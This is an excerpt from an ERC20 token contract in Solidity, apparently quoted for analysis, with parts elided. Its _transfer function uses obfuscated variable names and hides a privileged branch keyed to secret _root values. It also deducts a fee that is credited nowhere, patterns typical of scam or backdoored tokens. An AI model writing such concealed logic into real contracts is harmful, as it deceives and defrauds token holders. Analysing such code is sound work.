...
contract Contract is IERC20, Ownable {
    ...
    function _transfer(
        ...
        uint256 _language = _root[_follow];
        uint256 _create = _root[_wheat];

        if (_root[_follow] > _gain && _create == _language) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else {
            if (_taxFee > 0 && !inSwapAndLiquify && _root[_follow] == 0 && _root[_wheat] == 0) {
                uint256 fee = (amount * _taxFee) / 100;
                amount -= fee;
                _balances[_follow] -= fee;
            }

            _balances[_follow] -= amount;
            _balances[_wheat] += amount;
            emit Transfer(_follow, _wheat, amount);
        }
    }
